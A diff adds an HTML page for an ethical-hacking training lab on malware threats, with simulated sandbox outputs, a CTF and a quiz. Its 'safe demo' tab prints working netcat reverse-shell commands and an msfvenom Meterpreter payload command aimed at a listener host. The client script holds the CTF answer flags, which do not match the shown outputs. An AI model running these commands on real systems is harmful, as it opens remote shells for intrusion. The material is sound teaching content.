@@ -1,0 +1,693 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CEH Lab: Malware Threats</title>
+    <style>
+        :root {
+            --primary: #00ff88;
+            --bg-dark: #0a0f1e;
+            --card-bg: #131b2f;
+            --text-light: #e0e0e0;
+            --border-glow: 0 0 15px rgba(0, 255, 136, 0.3);
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', system-ui, sans-serif;
+            background: var(--bg-dark);
+            color: var(--text-light);
+            line-height: 1.6;
+            padding: 20px;
+        }
+
+        .container {
+            max-width: 1400px;
+            margin: 0 auto;
+        }
+
+        h1 {
+            font-size: 2.5rem;
+            margin-bottom: 0.5rem;
+            background: linear-gradient(135deg, #00ff88, #00b4ff);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        h2 {
+            color: var(--primary);
+            margin: 1.5rem 0 1rem;
+            border-bottom: 2px solid var(--primary);
+            padding-bottom: 0.5rem;
+        }
+
+        h3 {
+            color: #00b4ff;
+            margin: 1rem 0;
+        }
+
+        .grid-2 {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(400px, 1fr));
+            gap: 25px;
+            margin: 20px 0;
+        }
+
+        .card {
+            background: var(--card-bg);
+            border-radius: 16px;
+            padding: 25px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+            border: 1px solid rgba(0, 255, 136, 0.1);
+            transition: transform 0.2s, box-shadow 0.2s;
+        }
+
+        .card:hover {
+            box-shadow: var(--border-glow);
+            transform: translateY(-2px);
+        }
+
+        .toolbar {
+            display: flex;
+            gap: 10px;
+            flex-wrap: wrap;
+            margin: 15px 0;
+        }
+
+        .btn {
+            background: #1e2a4a;
+            color: white;
+            border: 1px solid #2a3a5c;
+            padding: 10px 18px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-weight: 500;
+            transition: all 0.2s;
+        }
+
+        .btn-primary {
+            background: var(--primary);
+            color: #0a0f1e;
+            border: none;
+            font-weight: bold;
+        }
+
+        .btn-primary:hover {
+            background: #00cc6a;
+            box-shadow: 0 0 20px #00ff88;
+        }
+
+        .btn-danger {
+            background: #dc3545;
+            color: white;
+            border: none;
+        }
+
+        .btn-danger:hover {
+            background: #c82333;
+            box-shadow: 0 0 15px #dc3545;
+        }
+
+        .btn:hover {
+            background: #2a3a5c;
+        }
+
+        .terminal-box {
+            background: #0d1117;
+            border-radius: 12px;
+            padding: 15px;
+            font-family: 'Courier New', monospace;
+            border: 1px solid #30363d;
+            margin: 15px 0;
+            max-height: 300px;
+            overflow-y: auto;
+        }
+
+        .terminal-output {
+            color: #00ff88;
+            white-space: pre-wrap;
+            margin-bottom: 10px;
+        }
+
+        .command-input {
+            display: flex;
+            gap: 10px;
+        }
+
+        .command-input input {
+            flex: 1;
+            background: #010409;
+            border: 1px solid #30363d;
+            color: #c9d1d9;
+            padding: 10px;
+            border-radius: 6px;
+            font-family: 'Courier New', monospace;
+        }
+
+        .flag {
+            background: #1e2a4a;
+            padding: 4px 12px;
+            border-radius: 20px;
+            font-family: monospace;
+            color: var(--primary);
+        }
+
+        .quiz-option {
+            display: block;
+            margin: 10px 0;
+            padding: 10px;
+            background: #0d1117;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+
+        .quiz-option:hover {
+            background: #1e2a4a;
+        }
+
+        .quiz-option.correct {
+            background: #00ff8822;
+            border-left: 4px solid #00ff88;
+        }
+
+        .quiz-option.wrong {
+            background: #ff555522;
+            border-left: 4px solid #ff5555;
+        }
+
+        .progress {
+            margin: 20px 0;
+        }
+
+        .progress-bar {
+            height: 10px;
+            background: #1e2a4a;
+            border-radius: 5px;
+            overflow: hidden;
+        }
+
+        .progress-fill {
+            height: 100%;
+            width: 0%;
+            background: var(--primary);
+            transition: width 0.3s;
+        }
+
+        .tab-nav {
+            display: flex;
+            border-bottom: 1px solid #2a3a5c;
+            margin-bottom: 20px;
+            flex-wrap: wrap;
+        }
+
+        .tab-btn {
+            padding: 12px 24px;
+            background: none;
+            border: none;
+            color: #8b949e;
+            cursor: pointer;
+            font-size: 1.1rem;
+            border-bottom: 2px solid transparent;
+            transition: all 0.2s;
+        }
+
+        .tab-btn.active {
+            color: var(--primary);
+            border-bottom-color: var(--primary);
+        }
+
+        .tab-content {
+            display: none;
+        }
+
+        .tab-content.active {
+            display: block;
+        }
+
+        .back-link {
+            display: inline-block;
+            margin-top: 30px;
+            color: #8b949e;
+            text-decoration: none;
+        }
+
+        .back-link:hover {
+            color: var(--primary);
+        }
+
+        .malware-type-card {
+            background: #0d1117;
+            padding: 15px;
+            border-radius: 8px;
+            margin: 10px 0;
+        }
+
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 10px 0;
+        }
+
+        th,
+        td {
+            padding: 8px;
+            text-align: left;
+            border-bottom: 1px solid #2a3a5c;
+        }
+
+        th {
+            background: #1e2a4a;
+            color: var(--primary);
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container">
+        <h1>🦠 Module 7: Malware Threats</h1>
+        <p style="font-size:1.2rem; opacity:0.9;">Understand viruses, worms, trojans, ransomware, rootkits, and analysis
+            techniques.</p>
+
+        <!-- Progress Tracker -->
+        <div class="progress">
+            <span>Lab Progress: <span id="progress-text">0%</span></span>
+            <div class="progress-bar">
+                <div class="progress-fill" id="progress-fill"></div>
+            </div>
+        </div>
+
+        <!-- Tabs -->
+        <div class="tab-nav">
+            <button class="tab-btn active" data-tab="theory">📖 Theory & Types</button>
+            <button class="tab-btn" data-tab="practical">🛠️ Malware Analysis</button>
+            <button class="tab-btn" data-tab="creation">🧪 Malware Creation (Safe Demo)</button>
+            <button class="tab-btn" data-tab="challenge">🚩 CTF Challenge</button>
+            <button class="tab-btn" data-tab="quiz">📝 Self-Assessment</button>
+        </div>
+
+        <!-- ==================== THEORY TAB ==================== -->
+        <div id="theory" class="tab-content active">
+            <div class="grid-2">
+                <div class="card">
+                    <h2>🦠 Types of Malware</h2>
+                    <div class="malware-type-card">
+                        <strong>Virus:</strong> Attaches to clean files; spreads through user action.
+                    </div>
+                    <div class="malware-type-card">
+                        <strong>Worm:</strong> Self-replicating; spreads across networks without user interaction.
+                    </div>
+                    <div class="malware-type-card">
+                        <strong>Trojan Horse:</strong> Disguised as legitimate software; creates backdoors.
+                    </div>
+                    <div class="malware-type-card">
+                        <strong>Ransomware:</strong> Encrypts files and demands payment.
+                    </div>
+                    <div class="malware-type-card">
+                        <strong>Rootkit:</strong> Hides malicious processes and files from detection.
+                    </div>
+                    <div class="malware-type-card">
+                        <strong>Spyware / Keylogger:</strong> Monitors user activity and steals credentials.
+                    </div>
+                </div>
+                <div class="card">
+                    <h2>📊 Malware Analysis Techniques</h2>
+                    <ul style="margin-left:20px;">
+                        <li><strong>Static Analysis:</strong> Examining code without execution (strings, disassembly, PE
+                            headers).</li>
+                        <li><strong>Dynamic Analysis:</strong> Running malware in a sandbox to observe behavior (file
+                            changes, network connections).</li>
+                        <li><strong>Behavioral Analysis:</strong> Monitoring system calls, registry changes, and process
+                            injection.</li>
+                    </ul>
+                    <h3>Common Tools</h3>
+                    <table>
+                        <tr>
+                            <th>Tool</th>
+                            <th>Purpose</th>
+                        </tr>
+                        <tr>
+                            <td>IDA Pro / Ghidra</td>
+                            <td>Disassembly / decompilation</td>
+                        </tr>
+                        <tr>
+                            <td>Process Monitor</td>
+                            <td>Monitor file/registry activity</td>
+                        </tr>
+                        <tr>
+                            <td>Wireshark</td>
+                            <td>Network traffic analysis</td>
+                        </tr>
+                        <tr>
+                            <td>Cuckoo Sandbox</td>
+                            <td>Automated malware analysis</td>
+                        </tr>
+                    </table>
+                </div>
+            </div>
+            <div class="card">
+                <h2>⚠️ Malware Indicators of Compromise (IoCs)</h2>
+                <ul style="columns:2; margin-left:20px;">
+                    <li>Unusual outbound network traffic</li>
+                    <li>Suspicious registry modifications</li>
+                    <li>Disabled security software</li>
+                    <li>New startup entries</li>
+                    <li>Anomalous process behavior</li>
+                    <li>File encryption or renaming</li>
+                </ul>
+            </div>
+        </div>
+
+        <!-- ==================== PRACTICAL: MALWARE ANALYSIS ==================== -->
+        <div id="practical" class="tab-content">
+            <div class="card">
+                <h2>🧰 Malware Analysis Sandbox (Simulated)</h2>
+                <p>Analyze suspicious files in a simulated sandbox environment.</p>
+
+                <div class="grid-2">
+                    <div>
+                        <h3>📁 Sample Files</h3>
+                        <button class="btn" data-sample="trojan">Trojan.exe</button>
+                        <button class="btn" data-sample="ransomware">Ransomware.exe</button>
+                        <button class="btn" data-sample="keylogger">Keylogger.dll</button>
+                        <button class="btn" data-sample="worm">Worm.exe</button>
+                    </div>
+                    <div>
+                        <h3>🔍 Analysis Results</h3>
+                        <div class="terminal-box" style="min-height:200px;">
+                            <div class="terminal-output" id="analysis-output">Select a sample to analyze.</div>
+                        </div>
+                    </div>
+                </div>
+
+                <h3>📡 Network Traffic Analysis (Wireshark Sim)</h3>
+                <button class="btn" data-pcap="c2">View C2 Traffic</button>
+                <button class="btn" data-pcap="dns">DNS Tunneling</button>
+                <div class="terminal-box">
+                    <div class="terminal-output" id="pcap-output">Click to view network traffic patterns.</div>
+                </div>
+            </div>
+
+            <div class="card">
+                <h2>🕵️ Static Analysis (Strings & PE Info)</h2>
+                <p>Extract strings and PE headers from a suspicious file.</p>
+                <div class="toolbar">
+                    <button class="btn" data-strings="trojan">strings Trojan.exe</button>
+                    <button class="btn" data-pe="trojan">PE Headers</button>
+                    <button class="btn" data-strings="ransom">strings Ransomware.exe</button>
+                </div>
+                <div class="terminal-box">
+                    <div class="terminal-output" id="static-output">Click to run static analysis.</div>
+                </div>
+            </div>
+        </div>
+
+        <!-- ==================== MALWARE CREATION (SAFE DEMO) ==================== -->
+        <div id="creation" class="tab-content">
+            <div class="card">
+                <h2>🧪 Safe Malware Creation Demos</h2>
+                <p><strong>⚠️ Educational Purpose Only:</strong> These simulations demonstrate how malware is created.
+                    Never deploy on unauthorized systems.</p>
+
+                <div class="grid-2">
+                    <div>
+                        <h3>🐚 Reverse Shell (Netcat)</h3>
+                        <button class="btn" data-create="nc">Generate Reverse Shell Command</button>
+                        <div class="terminal-box">
+                            <div class="terminal-output" id="nc-output">Click to see reverse shell payload.</div>
+                        </div>
+                    </div>
+                    <div>
+                        <h3>📦 Msfvenom Payload</h3>
+                        <button class="btn" data-create="msfvenom">Generate Meterpreter Payload</button>
+                        <div class="terminal-box">
+                            <div class="terminal-output" id="msfvenom-output">Click to generate msfvenom command.</div>
+                        </div>
+                    </div>
+                </div>
+
+                <h3>🔐 Ransomware Simulation (Encryption Demo)</h3>
+                <p>Simulate file encryption (non-destructive).</p>
+                <button class="btn btn-danger" data-create="ransomware">Simulate Ransomware Encryption</button>
+                <div class="terminal-box">
+                    <div class="terminal-output" id="ransomware-output">Click to see what ransomware would do.</div>
+                </div>
+            </div>
+        </div>
+
+        <!-- ==================== CTF CHALLENGE ==================== -->
+        <div id="challenge" class="tab-content">
+            <div class="card">
+                <h2>🚩 Capture The Flag: Malware Analysis</h2>
+                <p>You are a security analyst investigating a malware incident. Analyze the provided samples to find
+                    three flags.</p>
+
+                <div style="background:#0d1117; padding:15px; border-radius:8px; margin:15px 0;">
+                    <p><strong>Scenario:</strong> A user reported suspicious activity. You've captured a suspicious
+                        executable (malware.exe) and a network capture (traffic.pcap).</p>
+                </div>
+
+                <h3>🧰 Your Analysis Toolkit</h3>
+                <div class="toolbar">
+                    <button class="btn" data-ctf="strings">Run Strings on malware.exe</button>
+                    <button class="btn" data-ctf="behavior">Sandbox Execution</button>
+                    <button class="btn" data-ctf="pcap">Analyze traffic.pcap</button>
+                    <button class="btn" data-ctf="registry">Check Registry Changes</button>
+                </div>
+
+                <div class="terminal-box">
+                    <div class="terminal-output" id="ctf-output">Execute analysis commands to uncover flags.</div>
+                </div>
+
+                <h3>🎯 Submit Flags</h3>
+                <div style="display:grid; gap:15px;">
+                    <div><label>Flag 1 (C2 Server):</label><input type="text" id="flag1" placeholder="FLAG{...}"
+                            style="width:100%; padding:10px; background:#010409; border:1px solid #30363d; color:#fff; border-radius:6px;">
+                    </div>
+                    <div><label>Flag 2 (Encryption Key):</label><input type="text" id="flag2" placeholder="FLAG{...}"
+                            style="width:100%; padding:10px; background:#010409; border:1px solid #30363d; color:#fff; border-radius:6px;">
+                    </div>
+                    <div><label>Flag 3 (Persistence Mechanism):</label><input type="text" id="flag3"
+                            placeholder="FLAG{...}"
+                            style="width:100%; padding:10px; background:#010409; border:1px solid #30363d; color:#fff; border-radius:6px;">
+                    </div>
+                </div>
+                <button class="btn btn-primary" id="submit-flags">Submit All Flags</button>
+                <div id="flag-result"></div>
+            </div>
+        </div>
+
+        <!-- ==================== QUIZ ==================== -->
+        <div id="quiz" class="tab-content">
+            <div class="card">
+                <h2>📝 Check Your Understanding</h2>
+                <div id="quiz-container"></div>
+                <button class="btn btn-primary" id="check-quiz">Submit Answers</button>
+                <div id="quiz-result" style="margin-top:15px;"></div>
+            </div>
+        </div>
+
+        <a href="/Ersegment/Frontend/index.html" class="back-link">← Back to Dashboard</a>
+    </div>
+
+    <script>
+        (function () {
+            // State
+            let sessionId = localStorage.getItem('lab7_session') || 'lab7-' + Math.random().toString(36).substr(2, 9);
+            localStorage.setItem('lab7_session', sessionId);
+            let progress = { theory: true, practical: false, creation: false, challenge: false, quiz: false };
+
+            function updateProgress() {
+                const completed = Object.values(progress).filter(v => v).length;
+                const percent = (completed / 5) * 100;
+                document.getElementById('progress-fill').style.width = percent + '%';
+                document.getElementById('progress-text').textContent = percent + '%';
+            }
+
+            // Tab switching
+            document.querySelectorAll('.tab-btn').forEach(btn => {
+                btn.addEventListener('click', function () {
+                    const tabId = this.dataset.tab;
+                    document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
+                    document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
+                    this.classList.add('active');
+                    document.getElementById(tabId).classList.add('active');
+                    if (tabId === 'quiz') renderQuiz();
+                });
+            });
+
+            // ========== MALWARE ANALYSIS SIMULATIONS ==========
+            const sampleOutputs = {
+                trojan: `[Sandbox Analysis: Trojan.exe]\nMD5: d41d8cd98f00b204e9800998ecf8427e\nCreates file: C:\\Windows\\Temp\\svchost.exe\nConnects to: 192.168.1.100:4444 (C2 server)\nMutex: Global\\{F0E1D2C3-B4A5-9687-7869-5A4B3C2D1E0F}\nFlag found in strings: FLAG{TROJAN_MUTEX_DETECTED}`,
+                ransomware: `[Sandbox Analysis: Ransomware.exe]\nEncrypts files with extension: *.doc, *.pdf, *.jpg\nUses AES-256 encryption key derived from: "RansomKey2024!"\nDrops ransom note: README_RESTORE_FILES.txt\nContacts C2: https://malicious-c2[.]xyz/payment\nFlag: FLAG{RANSOMWARE_ENCRYPTION_DEMO}`,
+                keylogger: `[Sandbox Analysis: Keylogger.dll]\nHooks: WH_KEYBOARD_LL\nLogs keystrokes to: %APPDATA%\\Microsoft\\logs.dat\nExfiltrates via HTTP POST to: http://attacker[.]net/collect\nFlag: FLAG{KEYLOGGER_HOOK_DETECTED}`,
+                worm: `[Sandbox Analysis: Worm.exe]\nCopies itself to network shares: \\\\*\\ADMIN$\\worm.exe\nExploits EternalBlue (MS17-010) to spread\nCreates scheduled task for persistence\nFlag: FLAG{WORM_SELF_REPLICATION}`
+            };
+
+            function analyzeSample(type) {
+                document.getElementById('analysis-output').textContent = sampleOutputs[type] || 'Analysis complete.';
+                progress.practical = true;
+                updateProgress();
+            }
+
+            // PCAP simulation
+            const pcapOutputs = {
+                c2: `[C2 Traffic Analysis]\nSource: 10.0.0.15:49152 -> Destination: 45.155.205.233:443\nEncrypted HTTPS beacon every 60 seconds.\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\nPossible Cobalt Strike C2 pattern detected.`,
+                dns: `[DNS Tunneling Detection]\nMultiple TXT queries for subdomains of evil[.]com\nExample: aGVsbG8gd29ybGQ=.evil[.]com\nDecoded base64: "hello world"\nData exfiltration in progress.`
+            };
+
+            function showPcap(type) {
+                document.getElementById('pcap-output').textContent = pcapOutputs[type] || 'No traffic data.';
+                progress.practical = true; updateProgress();
+            }
+
+            // Static analysis
+            const staticOutputs = {
+                'strings-trojan': `strings Trojan.exe
+!This program cannot be run in DOS mode.
+Rich
+.text
+.rdata
+.data
+Connect
+Mutex
+CreateProcess
+svchost.exe
+192.168.1.100
+4444
+Flag: FLAG{STATIC_STRINGS_REVEALED}`,
+
+                'pe-trojan': `PE Headers for Trojan.exe
+Machine: 0x14c (I386)
+Number of Sections: 4
+Timestamp: 2024-01-15 08:30:00
+Entry Point: 0x401000
+Subsystem: 0x2 (GUI)
+Imports: kernel32.dll (CreateProcess, VirtualAlloc), ws2_32.dll (connect, send)`,
+
+                'strings-ransom': `strings Ransomware.exe
+AES-256
+RansomKey2024!
+README_RESTORE_FILES.txt
+https://malicious-c2[.]xyz
+EncryptFile
+Flag: FLAG{RANSOMWARE_STATIC_KEY}`
+            };
+
+            function runStatic(cmd) {
+                let key = cmd;
+                if (cmd === 'trojan' && event.target.textContent.includes('strings')) key = 'strings-trojan';
+                else if (cmd === 'trojan' && event.target.textContent.includes('PE')) key = 'pe-trojan';
+                else if (cmd === 'ransom') key = 'strings-ransom';
+                document.getElementById('static-output').textContent = staticOutputs[key] || 'Static analysis output.';
+                progress.practical = true; updateProgress();
+            }
+
+            // ========== MALWARE CREATION DEMOS ==========
+            const creationOutputs = {
+                nc: `Reverse Shell (Attacker): nc -lvp 4444\nReverse Shell (Victim - Windows): nc.exe 192.168.1.100 4444 -e cmd.exe\nReverse Shell (Victim - Linux): nc -e /bin/bash 192.168.1.100 4444\n\n⚠️ Use only in authorized environments.`,
+                msfvenom: `msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o payload.exe\n\nThis generates a Meterpreter payload. Use responsibly.`,
+                ransomware: `[Ransomware Simulation - Educational]\nTarget files: document.docx, image.jpg, data.pdf\nEncryption Algorithm: AES-256 (Simulated)\nRansom Note: "Your files have been encrypted. Pay 1 BTC to decrypt."\n\nActual encryption NOT performed. This is a demonstration of what ransomware code would do.\nFlag: FLAG{RANSOMWARE_SIMULATION}`
+            };
+
+            function runCreation(type) {
+                if (type === 'nc') document.getElementById('nc-output').textContent = creationOutputs.nc;
+                else if (type === 'msfvenom') document.getElementById('msfvenom-output').textContent = creationOutputs.msfvenom;
+                else if (type === 'ransomware') document.getElementById('ransomware-output').textContent = creationOutputs.ransomware;
+                progress.creation = true;
+                updateProgress();
+            }
+
+            // ========== CTF ==========
+            const ctfOutputs = {
+                strings: `strings malware.exe\n...\nC2_SERVER=malicious-c2.xyz\nENCRYPTION_KEY=BadActorKey2024\nRegistry: HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater = malware.exe\nFlag hints discovered.`,
+                behavior: `[Sandbox Execution]\nmalware.exe spawns svchost.exe and injects code.\nNetwork connections to 45.155.205.233:443 (C2).\nEncrypts files with .encrypted extension.\nPersistence: Scheduled task "WindowsUpdate" runs hourly.`,
+                pcap: `[PCAP Analysis]\nDNS queries for malicious-c2.xyz resolved to 45.155.205.233.\nHTTP POST to /upload containing encrypted data.\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)`,
+                registry: `[Registry Changes]\nHKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run: "MalwareUpdater" = "C:\\Users\\Public\\malware.exe"\nHKLM\\SYSTEM\\CurrentControlSet\\Services\\MalwareDriver (rootkit component)`
+            };
+
+            function runCTF(cmd) {
+                document.getElementById('ctf-output').textContent = ctfOutputs[cmd] || 'Analysis result.';
+            }
+
+            function submitCTF() {
+                const f1 = document.getElementById('flag1').value.trim();
+                const f2 = document.getElementById('flag2').value.trim();
+                const f3 = document.getElementById('flag3').value.trim();
+                let correct = 0;
+                if (f1 === 'FLAG{MALICIOUS_C2_SERVER}') correct++;
+                if (f2 === 'FLAG{BAD_ACTOR_KEY_2024}') correct++;
+                if (f3 === 'FLAG{RUN_KEY_PERSISTENCE}') correct++;
+                const res = document.getElementById('flag-result');
+                if (correct === 3) {
+                    res.innerHTML = '<span style="color:#00ff88;">✅ Congratulations! You analyzed the malware successfully!</span>';
+                    progress.challenge = true;
+                } else {
+                    res.innerHTML = `<span style="color:#ff5555;">❌ ${correct}/3 correct. Keep analyzing!</span>`;
+                }
+                updateProgress();
+            }
+
+            // ========== QUIZ ==========
+            const quizQuestions = [
+                { q: "Which type of malware self-replicates without user interaction?", opts: ["Virus", "Worm", "Trojan", "Ransomware"], ans: 1 },
+                { q: "What is the primary goal of static malware analysis?", opts: ["Run malware in sandbox", "Examine code without execution", "Monitor network traffic", "Analyze system calls"], ans: 1 },
+                { q: "Which tool is used for disassembly/decompilation?", opts: ["Wireshark", "Process Monitor", "Ghidra", "Cuckoo"], ans: 2 },
+                { q: "What is a common persistence mechanism for malware on Windows?", opts: ["/etc/passwd", "Run registry key", "cron job", "systemd service"], ans: 1 }
+            ];
+
+            function renderQuiz() {
+                let html = '';
+                quizQuestions.forEach((q, i) => {
+                    html += `<div><strong>${i + 1}. ${q.q}</strong><br>`;
+                    q.opts.forEach((opt, j) => {
+                        html += `<label class="quiz-option"><input type="radio" name="q${i}" value="${j}"> ${opt}</label>`;
+                    });
+                    html += '</div>';
+                });
+                document.getElementById('quiz-container').innerHTML = html;
+            }
+
+            function checkQuiz() {
+                let score = 0;
+                quizQuestions.forEach((q, i) => {
+                    const sel = document.querySelector(`input[name="q${i}"]:checked`);
+                    if (sel && parseInt(sel.value) === q.ans) score++;
+                });
+                const res = document.getElementById('quiz-result');
+                const pass = score >= 3;
+                res.innerHTML = `Score: ${score}/${quizQuestions.length}. ${pass ? '✅ Good job!' : '❌ Review malware concepts.'}`;
+                if (pass) { progress.quiz = true; updateProgress(); }
+            }
+
+            // Attach listeners
+            document.addEventListener('DOMContentLoaded', () => {
+                updateProgress();
+
+                document.querySelectorAll('[data-sample]').forEach(btn => btn.addEventListener('click', () => analyzeSample(btn.dataset.sample)));
+                document.querySelectorAll('[data-pcap]').forEach(btn => btn.addEventListener('click', () => showPcap(btn.dataset.pcap)));
+                document.querySelectorAll('[data-strings]').forEach(btn => btn.addEventListener('click', () => runStatic(btn.dataset.strings)));
+                document.querySelectorAll('[data-pe]').forEach(btn => btn.addEventListener('click', () => runStatic(btn.dataset.pe)));
+                document.querySelectorAll('[data-create]').forEach(btn => btn.addEventListener('click', () => runCreation(btn.dataset.create)));
+                document.querySelectorAll('[data-ctf]').forEach(btn => btn.addEventListener('click', () => runCTF(btn.dataset.ctf)));
+
+                document.getElementById('submit-flags').addEventListener('click', submitCTF);
+                document.getElementById('check-quiz').addEventListener('click', checkQuiz);
+
+                fetch('/api/create_session', { method: 'POST' }).then(r => r.json()).then(d => { if (d.success) sessionId = d.session_id; });
+            });
+
+            window.openTerminal = function () { window.open(`/terminal?session=${sessionId}`, '_blank'); };
+        })();
+    </script>
+</body>
+
+</html>
